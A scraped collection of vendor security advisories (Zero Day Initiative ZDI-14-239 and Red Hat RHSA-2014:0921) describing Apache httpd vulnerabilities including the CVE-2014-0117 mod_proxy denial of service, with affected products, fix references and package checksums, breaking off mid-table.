=== Content from lists.apache.org_ba0752cb_20250125_143742.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from lists.apache.org_283745a9_20250125_143743.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from zerodayinitiative.com_5ec34125_20250125_143740.html ===

[![thezdi](/images/logo.svg)](/)

Menu

* [PRIVACY](https://www.trendmicro.com/privacy)
* [WHO WE ARE](/about/)
* [HOW IT WORKS](/about/benefits/)
* [BLOG](/blog/)
* [ADVISORIES](/advisories/)
* [LOG IN](/portal/)
  [SIGN UP](/portal/register/)

Menu

* [PRIVACY](https://www.trendmicro.com/privacy/)
* [WHO WE ARE](/about/)
* [HOW IT WORKS](/about/benefits/)
* [BLOG](/blog/)
* [ADVISORIES](/advisories/)
* [LOG IN](/portal/)
* [SIGN UP](/portal/register/)

* [![thezdi](/images/logo.svg)](/)
* [Trend Micro](https://www.trendmicro.com/)

# Advisory Details

July 18th, 2014
## Apache HTTP Server mod\_proxy Denial Of Service Vulnerability

### ZDI-14-239ZDI-CAN-2241

| CVE ID | [CVE-2014-0117](https://www.cve.org/CVERecord?id=CVE-2014-0117) |
| --- | --- |
| CVSS SCORE | 7.8, [AV:N/AC:L/Au:N/C:N/I:N/A:C](http://nvd.nist.gov/cvss.cfm?calculator&version=2.0&vector=AV:N/AC:L/Au:N/C:N/I:N/A:C) |
| AFFECTED VENDORS | Apache |
| AFFECTED PRODUCTS | HTTPD Server 2.x |
| TREND MICRO CUSTOMER PROTECTION | Trend Micro TippingPoint IPS customers are protected against this vulnerability by Digital Vaccine protection filter ID ['13795']. For further product information on the TippingPoint IPS: <http://www.tippingpoint.com> |
| VULNERABILITY DETAILS | This vulnerability allows remote attackers to cause a denial of service condition on vulnerable installations of Apache HTTP Server. Authentication is not required to exploit this vulnerability.  The specific flaw exists within the mod\_proxy module. The issue lies in the processing of HTTP headers when an invalid request is made. An attacker can leverage this flaw to crash a remote instance of Apache HTTP server. |
| ADDITIONAL DETAILS | Apache has issued an update to correct this vulnerability. More details can be found at: |
| DISCLOSURE TIMELINE | * 2014-04-07 - Vulnerability reported to vendor * 2014-07-18 - Coordinated public release of advisory |
| CREDIT | AKAT-122733db72ab3ed94b5f8a1ffcde850251fe6f466Marek Kroemeke |

[BACK TO ADVISORIES](/advisories/)

### General Inquiries

zdi@trendmicro.com

### Find us on X

[@thezdi](https://twitter.com/thezdi)

### Find us on Mastodon

[Mastodon](https://infosec.exchange/%40thezdi)

### Media Inquiries

media\_relations@trendmicro.com

### Sensitive Email Communications

[PGP Key](https://www.zerodayinitiative.com/documents/zdi-pgp-key.asc)

[WHO WE ARE](/about/)

* [Our Mission](/about/)
* [Trend Micro](https://www.trendmicro.com)
* [TippingPoint IPS](https://www.trendmicro.com/en_us/business/products/network/integrated-atp/next-gen-intrusion-prevention-system.html)

[HOW IT WORKS](/about/benefits/)

* [Process](/about/benefits/#process)
* [Researcher Rewards](/about/benefits/#researcher-rewards)
* [FAQS](/about/faq/)
* [Privacy](https://www.trendmicro.com/privacy/)

[ADVISORIES](/advisories)

* [Published Advisories](/advisories/published)
* [Upcoming Advisories](/advisories/upcoming)
* [RSS Feeds](/rss)

[BLOG](/blog)

[![thezdi](/images/logo-footer.svg)](/)



=== Content from lists.apache.org_9571df72_20250125_143743.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from rhn.redhat.com_6b6f5374_20250126_093432.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2014:0921 - Security Advisory

Issued:
2014-07-23
Updated:
2014-07-23
# RHSA-2014:0921 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: httpd security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2014%3A0921)

## Topic

Updated httpd packages that fix multiple security issues are now available
for Red Hat Enterprise Linux 7.

The Red Hat Security Response Team has rated this update as having
Important security impact. Common Vulnerability Scoring System (CVSS) base
scores, which give detailed severity ratings, are available for each
vulnerability from the CVE links in the References section.

## Description

The httpd packages provide the Apache HTTP Server, a powerful, efficient,
and extensible web server.

A race condition flaw, leading to heap-based buffer overflows, was found in
the mod\_status httpd module. A remote attacker able to access a status page
served by mod\_status on a server using a threaded Multi-Processing Module
(MPM) could send a specially crafted request that would cause the httpd
child process to crash or, possibly, allow the attacker to execute
arbitrary code with the privileges of the "apache" user. (CVE-2014-0226)

A NULL pointer dereference flaw was found in the mod\_cache httpd module.
A malicious HTTP server could cause the httpd child process to crash when
the Apache HTTP Server was used as a forward proxy with caching.
(CVE-2013-4352)

A denial of service flaw was found in the mod\_proxy httpd module. A remote
attacker could send a specially crafted request to a server configured as a
reverse proxy using a threaded Multi-Processing Modules (MPM) that would
cause the httpd child process to crash. (CVE-2014-0117)

A denial of service flaw was found in the way httpd's mod\_deflate module
handled request body decompression (configured via the "DEFLATE" input
filter). A remote attacker able to send a request whose body would be
decompressed could use this flaw to consume an excessive amount of system
memory and CPU on the target system. (CVE-2014-0118)

A denial of service flaw was found in the way httpd's mod\_cgid module
executed CGI scripts that did not read data from the standard input.
A remote attacker could submit a specially crafted request that would cause
the httpd child process to hang indefinitely. (CVE-2014-0231)

All httpd users are advised to upgrade to these updated packages, which
contain backported patches to correct these issues. After installing the
updated packages, the httpd daemon will be restarted automatically.

## Solution

Before applying this update, make sure all previously released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to use the
Red Hat Network to apply this update are available at
<https://access.redhat.com/articles/11258>

## Affected Products

* Red Hat Enterprise Linux Server 7 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.7 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.6 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.5 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.4 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.3 x86\_64
* Red Hat Enterprise Linux Server - AUS 7.6 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support 7 x86\_64
* Red Hat Enterprise Linux Workstation 7 x86\_64
* Red Hat Enterprise Linux Desktop 7 x86\_64
* Red Hat Enterprise Linux for IBM z Systems 7 s390x
* Red Hat Enterprise Linux for IBM z Systems - Extended Update Support 7.6 s390x
* Red Hat Enterprise Linux for IBM z Systems - Extended Update Support 7.5 s390x
* Red Hat Enterprise Linux for IBM z Systems - Extended Update Support 7.4 s390x
* Red Hat Enterprise Linux for IBM z Systems - Extended Update Support 7.3 s390x
* Red Hat Enterprise Linux for Power, big endian 7 ppc64
* Red Hat Enterprise Linux for Power, big endian - Extended Update Support 7.7 ppc64
* Red Hat Enterprise Linux for Power, big endian - Extended Update Support 7.6 ppc64
* Red Hat Enterprise Linux for Power, big endian - Extended Update Support 7.5 ppc64
* Red Hat Enterprise Linux for Power, big endian - Extended Update Support 7.4 ppc64
* Red Hat Enterprise Linux for Power, big endian - Extended Update Support 7.3 ppc64
* Red Hat Enterprise Linux for Scientific Computing 7 x86\_64
* Red Hat Enterprise Linux Server from RHUI 7 x86\_64
* Red Hat Enterprise Linux Server - AUS 7.7 x86\_64
* Red Hat Enterprise Linux Server - AUS 7.4 x86\_64
* Red Hat Enterprise Linux Server - AUS 7.3 x86\_64
* Red Hat Enterprise Linux for IBM z Systems - Extended Update Support 7.7 s390x
* Red Hat Enterprise Linux Server - TUS 7.7 x86\_64
* Red Hat Enterprise Linux Server - TUS 7.6 x86\_64
* Red Hat Enterprise Linux Server - TUS 7.3 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support (for IBM z Systems) 7 s390x
* Red Hat Enterprise Linux EUS Compute Node 7.7 x86\_64
* Red Hat Enterprise Linux EUS Compute Node 7.6 x86\_64
* Red Hat Enterprise Linux EUS Compute Node 7.5 x86\_64
* Red Hat Enterprise Linux EUS Compute Node 7.4 x86\_64
* Red Hat Enterprise Linux EUS Compute Node 7.3 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.7 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.6 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.4 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.3 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support for IBM Power, big endian 7 ppc64

## Fixes

* [BZ - 1120596](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=1120596)
  - CVE-2014-0231 httpd: mod\_cgid denial of service
* [BZ - 1120599](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=1120599)
  - CVE-2014-0117 httpd: mod\_proxy denial of service
* [BZ - 1120601](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=1120601)
  - CVE-2014-0118 httpd: mod\_deflate denial of service
* [BZ - 1120603](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=1120603)
  - CVE-2014-0226 httpd: mod\_status heap-based buffer overflow
* [BZ - 1120604](https://bugzilla.redhat.com/bugzilla/show_bug.cgi?id=1120604)
  - CVE-2013-4352 httpd: mod\_cache NULL pointer dereference crash

## CVEs

* [CVE-2014-0231](https://www.redhat.com/security/data/cve/CVE-2014-0231.html)
* [CVE-2014-0118](https://www.redhat.com/security/data/cve/CVE-2014-0118.html)
* [CVE-2014-0117](https://www.redhat.com/security/data/cve/CVE-2014-0117.html)
* [CVE-2014-0226](https://www.redhat.com/security/data/cve/CVE-2014-0226.html)
* [CVE-2013-4352](https://www.redhat.com/security/data/cve/CVE-2013-4352.html)

## References

* <https://access.redhat.com/security/updates/classification/#important>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat Enterprise Linux Server 7

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| x86\_64 | |
| httpd-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 1bad8efb7d3d87e8611acb3f0546c6a3436554bea1a5d84dae6f879e9881a61b |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-devel-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: b37c6332025b7519a399e1bab337a28e32b18e8411c5077ca66ee2d18f48939c |
| httpd-manual-2.4.6-18.el7\_0.noarch.rpm | SHA-256: b05eeedfe5487ca74ff5591414c9e077bd325851ebb1684207920fbd9bab8e1f |
| httpd-tools-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: cf03510d0261e99e5fac9ce5b809c910a428cdb11e4ea2e1e5fb6036d82d8383 |
| mod\_ldap-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 040a5e46000b109dc768443606b93fdb34d118380fa0f3ae6bf1a9869ee708e1 |
| mod\_proxy\_html-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 44178d38cfc6f0a127027e9df8320e27a3719151b918133a47ca97dce3811b50 |
| mod\_session-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: a0cd7007ad1fe43c82b152b0bfe44d73bf60a8898e133d1a782e69bc6476dea8 |
| mod\_ssl-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: fb1321b30c96df4c68de8eb267248c898d6f288196fae60e224aa2421e4c6a92 |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.7

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| x86\_64 | |
| httpd-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 1bad8efb7d3d87e8611acb3f0546c6a3436554bea1a5d84dae6f879e9881a61b |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-devel-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: b37c6332025b7519a399e1bab337a28e32b18e8411c5077ca66ee2d18f48939c |
| httpd-manual-2.4.6-18.el7\_0.noarch.rpm | SHA-256: b05eeedfe5487ca74ff5591414c9e077bd325851ebb1684207920fbd9bab8e1f |
| httpd-tools-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: cf03510d0261e99e5fac9ce5b809c910a428cdb11e4ea2e1e5fb6036d82d8383 |
| mod\_ldap-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 040a5e46000b109dc768443606b93fdb34d118380fa0f3ae6bf1a9869ee708e1 |
| mod\_proxy\_html-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 44178d38cfc6f0a127027e9df8320e27a3719151b918133a47ca97dce3811b50 |
| mod\_session-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: a0cd7007ad1fe43c82b152b0bfe44d73bf60a8898e133d1a782e69bc6476dea8 |
| mod\_ssl-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: fb1321b30c96df4c68de8eb267248c898d6f288196fae60e224aa2421e4c6a92 |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.6

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| x86\_64 | |
| httpd-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 1bad8efb7d3d87e8611acb3f0546c6a3436554bea1a5d84dae6f879e9881a61b |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-devel-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: b37c6332025b7519a399e1bab337a28e32b18e8411c5077ca66ee2d18f48939c |
| httpd-manual-2.4.6-18.el7\_0.noarch.rpm | SHA-256: b05eeedfe5487ca74ff5591414c9e077bd325851ebb1684207920fbd9bab8e1f |
| httpd-tools-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: cf03510d0261e99e5fac9ce5b809c910a428cdb11e4ea2e1e5fb6036d82d8383 |
| mod\_ldap-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 040a5e46000b109dc768443606b93fdb34d118380fa0f3ae6bf1a9869ee708e1 |
| mod\_proxy\_html-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 44178d38cfc6f0a127027e9df8320e27a3719151b918133a47ca97dce3811b50 |
| mod\_session-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: a0cd7007ad1fe43c82b152b0bfe44d73bf60a8898e133d1a782e69bc6476dea8 |
| mod\_ssl-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: fb1321b30c96df4c68de8eb267248c898d6f288196fae60e224aa2421e4c6a92 |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.5

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| x86\_64 | |
| httpd-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 1bad8efb7d3d87e8611acb3f0546c6a3436554bea1a5d84dae6f879e9881a61b |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-devel-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: b37c6332025b7519a399e1bab337a28e32b18e8411c5077ca66ee2d18f48939c |
| httpd-manual-2.4.6-18.el7\_0.noarch.rpm | SHA-256: b05eeedfe5487ca74ff5591414c9e077bd325851ebb1684207920fbd9bab8e1f |
| httpd-tools-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: cf03510d0261e99e5fac9ce5b809c910a428cdb11e4ea2e1e5fb6036d82d8383 |
| mod\_ldap-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 040a5e46000b109dc768443606b93fdb34d118380fa0f3ae6bf1a9869ee708e1 |
| mod\_proxy\_html-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 44178d38cfc6f0a127027e9df8320e27a3719151b918133a47ca97dce3811b50 |
| mod\_session-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: a0cd7007ad1fe43c82b152b0bfe44d73bf60a8898e133d1a782e69bc6476dea8 |
| mod\_ssl-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: fb1321b30c96df4c68de8eb267248c898d6f288196fae60e224aa2421e4c6a92 |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.4

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| x86\_64 | |
| httpd-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 1bad8efb7d3d87e8611acb3f0546c6a3436554bea1a5d84dae6f879e9881a61b |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-devel-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: b37c6332025b7519a399e1bab337a28e32b18e8411c5077ca66ee2d18f48939c |
| httpd-manual-2.4.6-18.el7\_0.noarch.rpm | SHA-256: b05eeedfe5487ca74ff5591414c9e077bd325851ebb1684207920fbd9bab8e1f |
| httpd-tools-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: cf03510d0261e99e5fac9ce5b809c910a428cdb11e4ea2e1e5fb6036d82d8383 |
| mod\_ldap-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 040a5e46000b109dc768443606b93fdb34d118380fa0f3ae6bf1a9869ee708e1 |
| mod\_proxy\_html-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 44178d38cfc6f0a127027e9df8320e27a3719151b918133a47ca97dce3811b50 |
| mod\_session-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: a0cd7007ad1fe43c82b152b0bfe44d73bf60a8898e133d1a782e69bc6476dea8 |
| mod\_ssl-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: fb1321b30c96df4c68de8eb267248c898d6f288196fae60e224aa2421e4c6a92 |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.3

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| x86\_64 | |
| httpd-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 1bad8efb7d3d87e8611acb3f0546c6a3436554bea1a5d84dae6f879e9881a61b |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
| httpd-devel-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: b37c6332025b7519a399e1bab337a28e32b18e8411c5077ca66ee2d18f48939c |
| httpd-manual-2.4.6-18.el7\_0.noarch.rpm | SHA-256: b05eeedfe5487ca74ff5591414c9e077bd325851ebb1684207920fbd9bab8e1f |
| httpd-tools-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: cf03510d0261e99e5fac9ce5b809c910a428cdb11e4ea2e1e5fb6036d82d8383 |
| mod\_ldap-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 040a5e46000b109dc768443606b93fdb34d118380fa0f3ae6bf1a9869ee708e1 |
| mod\_proxy\_html-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 44178d38cfc6f0a127027e9df8320e27a3719151b918133a47ca97dce3811b50 |
| mod\_session-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: a0cd7007ad1fe43c82b152b0bfe44d73bf60a8898e133d1a782e69bc6476dea8 |
| mod\_ssl-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: fb1321b30c96df4c68de8eb267248c898d6f288196fae60e224aa2421e4c6a92 |

## Red Hat Enterprise Linux Server - AUS 7.7

| SRPM | |
| --- | --- |
| httpd-2.4.6-18.el7\_0.src.rpm | SHA-256: b06b0ee8c1216ec5c7357e675399f4feb2bfc50e8be98bd15d4c0b9f151cf048 |
| x86\_64 | |
| httpd-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 1bad8efb7d3d87e8611acb3f0546c6a3436554bea1a5d84dae6f879e9881a61b |
| httpd-debuginfo-2.4.6-18.el7\_0.x86\_64.rpm | SHA-256: 30f97cebe5dc1ed71bbf9e8cd1d7273c9500b3d88c77fb284ab28333eb11fce6 |
